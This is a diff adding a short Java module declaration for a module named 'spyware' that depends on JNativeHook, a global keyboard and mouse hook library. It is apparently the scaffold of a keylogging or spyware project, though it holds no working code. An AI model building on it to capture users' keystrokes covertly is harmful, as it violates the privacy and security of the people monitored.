@@ -1,0 +1,9 @@
+/**
+ * 
+ */
+/**
+ * 
+ */
+module spyware {
+	requires JNativeHook;
+}
